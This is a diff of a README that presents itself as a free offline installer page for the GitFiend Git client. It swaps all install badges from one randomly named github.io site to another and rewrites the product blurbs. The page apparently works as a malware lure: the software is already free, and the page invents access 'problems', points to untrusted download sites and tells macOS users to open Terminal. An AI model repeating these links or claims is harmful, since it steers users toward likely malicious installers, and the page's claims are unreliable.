@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Git+Client-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 GitFiend Free Installer** — GitFiend is a free, open-source Git GUI client for Windows, macOS, and Linux with a focus on a clean, modern interface. Works without internet access, no account required. Full offline installation.
+**💻 GitFiend Free Installer** — GitFiend is a free, open-source Git client for Windows, macOS, and Linux with a unique visual approach to presenting commits and branches. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install GitFiend](https://img.shields.io/badge/⬇_Install_GitFiend-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install GitFiend](https://img.shields.io/badge/⬇_Install_GitFiend-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About GitFiend
 
-GitFiend is a free, open-source Git GUI client for Windows, macOS, and Linux with a focus on a clean, modern interface. Features include a visual commit graph, commit creation, branch management, and basic diff viewing. GitFiend targets Git beginners and casual users who want an approachable visual interface for everyday Git operations.
+GitFiend is a free, open-source Git client for Windows, macOS, and Linux with a unique visual approach to presenting commits and branches. It focuses on making Git history readable and provides a simple interface for common Git operations.
 
 ---
 
 ## ❌ Problem: GitFiend is hard to access
 
-- **Limited Features** — Basic feature set; advanced Git operations require command line
-- **Small Community** — Limited resources and tutorials compared to major Git clients
-- **Development Activity** — Community project with variable update frequency
-- **Complex Workflows** — Not suitable for professional complex Git workflows
+- **Early Development** — Feature set still incomplete compared to mature clients
+- **Small Community** — Limited tutorials and user resources
+- **Limited Advanced Git** — Complex operations require falling back to command line
+- **Interface Style** — Visual approach distinctive but not for every user
 
 ---
 
@@ -61,9 +61,9 @@ GitFiend is a free, open-source Git GUI client for Windows, macOS, and Linux wit
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ GitFiend is a free, open-source Git GUI client for Windows, macOS, and Linux wit
 
 <div align="center">
 
-[![⬇ Install GitFiend](https://img.shields.io/badge/⬇_Install_GitFiend-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install GitFiend](https://img.shields.io/badge/⬇_Install_GitFiend-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ GitFiend is a free, open-source Git GUI client for Windows, macOS, and Linux wit
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ GitFiend is a free, open-source Git GUI client for Windows, macOS, and Linux wit
 
 ---
 
-**GitFiend Free Installer** — GitFiend is a free, open-source Git GUI client for Windows, macOS, and Linux with a focus on a clean, modern interface. Install without internet connection today!
+**GitFiend Free Installer** — GitFiend is a free, open-source Git client for Windows, macOS, and Linux with a unique visual approach to presenting commits and branches. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install GitFiend](https://img.shields.io/badge/⬇_Install_GitFiend-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install GitFiend](https://img.shields.io/badge/⬇_Install_GitFiend-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
